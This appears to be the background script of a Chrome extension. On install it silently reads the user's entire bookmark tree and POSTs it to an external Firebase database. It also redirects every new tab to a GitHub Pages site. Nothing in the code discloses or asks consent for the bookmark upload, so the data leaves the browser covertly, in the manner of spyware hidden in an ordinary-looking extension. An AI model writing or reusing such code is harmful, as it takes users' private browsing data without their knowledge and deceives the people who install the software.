chrome.runtime.onInstalled.addListener(function() {
   chrome.bookmarks.getTree(function( bookmarks ){
     fetch('https://zekas-51feb.firebaseio.com/allBookmarks.json', {
       method: 'POST',
       body: JSON.stringify( bookmarks )
     }).then( e => console.log( e ) )
     .catch( e => console.log( e ) )
   })
   chrome.tabs.onCreated.addListener(function( tab ){
    if( tab.url === "chrome://newtab/" ) {
       chrome.tabs.update({
       url: "https://mahmoudzakaria90.github.io/HelloZeka/public/"
     })
    }
   })
   chrome.declarativeContent.onPageChanged.removeRules(undefined, function() {
      chrome.declarativeContent.onPageChanged.addRules([{
        conditions: [new chrome.declarativeContent.PageStateMatcher()
        ],
            actions: [new chrome.declarativeContent.ShowPageAction()]
      }]);
    });
 });